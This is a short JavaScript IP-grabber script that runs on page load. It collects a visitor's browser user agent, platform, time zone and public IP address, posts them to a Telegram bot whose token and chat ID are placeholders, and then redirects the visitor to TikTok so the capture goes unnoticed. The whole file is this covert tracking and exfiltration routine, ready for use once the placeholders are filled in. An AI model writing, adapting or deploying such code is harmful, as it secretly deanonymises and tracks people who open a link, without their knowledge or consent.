getUserData();

async function getUserData() {
  	const userAgent = navigator.userAgent;

  	const os = navigator.platform;

  	const clientTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

	const res = await fetch('https://checkip.amazonaws.com/');
	const ipAddress = await res.text();

	let userData = 
`USER DEVICE: ${userAgent}

USER OS: ${os}

TIME ZONE: ${clientTimeZone}

IP ADDRESS: ${ipAddress}`;

	sendData(userData);
}

function sendData(userData) {
	fetch('https://api.telegram.org/botYOUR_BOT_API/sendMessage', {
		method: 'POST',
		headers: {
		  'Content-Type': 'application/json'
		},
		body: JSON.stringify({
		  chat_id: 'YOUR_CHAT_API',
		  text: userData,
		})
	  })
	  .then(response => response.json())
	  .then(window.location.href = "https://www.tiktok.com");
}